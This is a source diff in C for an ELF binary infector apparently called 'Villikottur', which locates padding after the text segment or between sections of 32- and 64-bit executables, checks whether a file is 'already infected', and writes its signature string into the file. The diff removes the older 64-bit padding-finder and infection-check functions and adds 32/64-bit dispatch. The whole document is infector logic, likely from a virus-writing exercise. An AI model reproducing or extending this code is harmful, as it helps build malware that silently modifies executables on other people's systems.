@@ -1,7 +1,5 @@
 #include "vil.h"
 
-char *message = "Villikottur v0.1 <pharatyk>";
-
 static int			error(char *whut)
 {
 	if (visual)
@@ -9,89 +7,28 @@ static int			error(char *whut)
 	return (1);
 }
 
-Elf64_Off	PaddingFinder_shdr(void *ptr)
-{   
-	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
-	u_int16_t	shnum 		= ehdr->e_shnum;
-	Elf64_Shdr *shdr = (Elf64_Shdr *)(ptr + ehdr->e_shoff);
-
-	Elf64_Off previous = 0;
-	Elf64_Off current = 0;
-	int i;
-	for (i = 1 ; i < shnum ; ++i)
-	{
-		previous = shdr[i - 1].sh_offset + shdr[i - 1].sh_size;
-		current = shdr[i].sh_offset;
-		if (!previous|| previous > current)
-			continue;
-		if ((current - previous) > strlen(message))
-			return (previous);
-	}
-	return 0;
-}
-
-Elf64_Off	PaddingFinder(void *ptr)
-{   
-	Elf64_Ehdr	*ehdr		= (Elf64_Ehdr *) ptr;
-	u_int16_t	phnum 		= ehdr->e_phnum;
-	Elf64_Phdr *phdr = (Elf64_Phdr *)(ptr + ehdr->e_phoff);
-
-	u_int16_t TEXT_SEGMENT_FOUND = 0;
-	Elf64_Off parasite_offset;
-	int i;
-	for (i = 0 ; i < phnum ; ++i)
-	{
-		if (TEXT_SEGMENT_FOUND  == 0 && phdr[i].p_type  == PT_LOAD &&
-			phdr[i].p_flags == (PF_R | PF_X))
-		{
-			TEXT_SEGMENT_FOUND = 1;
-			parasite_offset = phdr[i].p_offset + phdr[i].p_filesz;
-		}
-		else if (TEXT_SEGMENT_FOUND)
-		{
-			if ((phdr[i].p_offset - parasite_offset) > strlen(message))
-				return (parasite_offset);
-			return (0);
-		}
-	}
-
-	return 0;
-}
-
-int		check_copy(char *ptr, size_t size)
-{
-	for (int i = 0; i < size; ++i)
-	{
-		if (message[0] == ptr[i])
-		{
-			int j = 0;
-			int ms = strlen(message);
-			while (i < size && j < ms)
-			{
-				if (message[j] != ptr[i])
-					break;
-				++j;
-				++i;
-			}
-			if (j == ms)
-				return (1);
-		}
-	}
-	return (0);
-}
-
 int			write_string(char *ptr, off_t size, char *filename, int fd)
 {
 	if (visual)
 		fprintf(stdout, BOLDBLUE"-x-x-x-x- "RED"\\_<O>_<O>_/ "BLUE"-x-x-x-x-\n"RED"-> "CYAN"%s\n\n"RESET, filename);
+	message = "Villikottur v0.1 <pharatyk>";
 	if (check_copy(ptr, size))
 	{
 		if (visual)
+		{
 			fprintf(stderr, BOLDRED"<"CYAN"o"RED">"RESET CYAN"%s"YELLOW" already infected\n", filename);
+			fprintf(stdout, BOLDBLUE"-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n"RESET);
+		}
 		return (0);
 	}
-	// PaddingFinder(ptr);
-	Elf64_Off	endSegment = PaddingFinder_shdr(ptr);
+	int ret = is_32or64ELF(ptr);
+	if (!ret)
+		return (0);
+	off_t	endSegment;
+	if (ret == 2)
+		endSegment = PaddingFinder_shdr_64(ptr);
+	else if (ret == 1)
+		endSegment = PaddingFinder_shdr_32(ptr);
 	if (visual)
 		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" stuff in ["RED"%x"YELLOW"]\n"RESET, endSegment);
 	if (endSegment)
@@ -100,7 +37,10 @@ int			write_string(char *ptr, off_t size, char *filename, int fd)
 		write(fd, ptr, size);
 	}
 	if (visual)
+	{
 		fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" success \\o/  :  "CYAN"%s\n"RESET, filename);
+		fprintf(stdout, BOLDBLUE"-x-x-x-x-x-x-x-x-x-x-x-x-x-x-x-\n\n"RESET);
+	}
 
 	return (0);
 }
